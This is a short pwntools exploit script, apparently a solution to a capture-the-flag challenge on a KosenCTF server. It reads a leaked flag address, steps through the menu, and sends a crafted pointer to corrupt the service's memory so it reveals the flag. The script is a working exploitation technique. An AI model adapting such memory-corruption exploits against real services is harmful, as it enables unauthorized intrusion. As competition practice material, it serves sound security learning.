#!/usr/bin/env python
from pwn import *

s = remote('pwn.kosenctf.com', 9001)

s.recvuntil('located at ')
flag = int(s.recvuntil('.')[:-1], 0x10)
log.info('flag: %#x' % flag)

s.sendlineafter('> ', '1')
s.sendlineafter(': ', 'A')
s.sendlineafter('> ', '2')
s.sendlineafter(': ', 'A')
s.sendlineafter('> ', '4')
s.sendlineafter(': ', 'A')
s.sendlineafter('> ', p64(flag - 0x10))

s.interactive()
